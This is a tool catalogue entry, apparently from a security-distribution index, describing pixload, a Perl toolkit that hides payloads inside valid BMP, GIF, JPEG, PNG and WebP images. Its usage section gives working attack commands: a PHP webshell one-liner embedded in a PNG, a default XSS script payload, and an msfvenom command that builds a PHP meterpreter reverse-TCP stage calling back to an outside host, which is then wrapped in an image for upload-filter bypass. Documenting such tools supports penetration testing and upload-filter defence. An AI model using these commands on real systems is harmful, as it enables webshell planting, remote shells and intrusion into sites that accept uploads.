---
name: "pixload"
categories:
  - blackarch-webapp
version: "87.a8f58a7"
homepage: "https://github.com/sighook/pixload"
packaged-by: [blackarch]
blackarch-builddate: "2025-07-18"
build-system: perl
license: WTFPL
meta-checked: "2026-11-09"
github-repo: "sighook/pixload"
github-stars: 1304
github-pushed: "2023-11-30"
github-archived: false
github-issues: 8
github-match: "exact"
gh-checked: "2026-11-09"
worth: 3.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# pixload

> Perl toolkit that generates or injects payload-carrying BMP/GIF/JPG/PNG/WebP images (image polyglots).

## What it's for

Crafting image files that are structurally valid pictures but also carry an attacker-controlled string — the classic building blocks for CSP-bypass XSS via polyglot images, hidden webshell delivery, or stashing payloads in upload queues that only accept images. Five per-format tools (`pixload-bmp/gif/jpg/png/webp`) each create a minimal new image or inject into an existing file, with `-P/--payload` choosing the embedded string (default: `<script src=//example.com></script>`). Each format hides the payload differently (PNG adds a custom chunk, GIF/BMP abuse comment mechanics, JPEG offers COM or DQT sections, WebP only supports fresh files). It does not exploit anything by itself — the payload must fit whatever sink the target application has. The author's account was renamed (`chinarulezzz` → `sighook`).

## Typical use cases

### Create a payload-carrying PNG

Generate a fresh 1×1-class PNG with your payload embedded in an injected chunk.

```
pixload-png --payload '<?php system($_GET["c"]); ?>' payload.png
```

Outcome: prints the PNG chunk walk (IHDR/pHYs/IDAT/IEND), injects the payload into a new `pUnk` chunk and hexdumps the result — the file remains a valid, viewable PNG.

### Build a polyglot GIF/BMP with the default XSS payload

Use the comment-trick formats without typing a payload.

```
pixload-gif payload.gif
```

Outcome: creates a valid GIF whose header bytes double as an opened comment, with the default `<script src=//example.com></script>` payload appended — the same shape works for `pixload-bmp payload.bmp`.

### Inject into a JPEG comment or quantization table

Choose where in an existing/new JPEG the payload lands.

```
pixload-jpg -S com payload.jpg
```

Outcome: writes the payload into the JPEG's COMMENT section (`-S dqt` targets the quantization table instead) and hexdumps the file to confirm placement; if `payload.jpg` already exists, the payload is injected into that file rather than a fresh image.

### Wrap a meterpreter/stage payload into an image

Chain with msfvenom output for upload-restricted delivery.

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=198.51.100.10 LPORT=31337 -f raw > payload.php
pixload-png --payload "$(cat payload.php)" payload.png
```

Outcome: the stage bytes are carried inside the PNG chunk structure, ready to test against image-upload flows that preserve file contents; recover the payload on the other side the way your delivery chain expects.

*Provenance: no corpus evidence — derived from upstream documentation (README per-tool help blocks, verified 2026-11).*
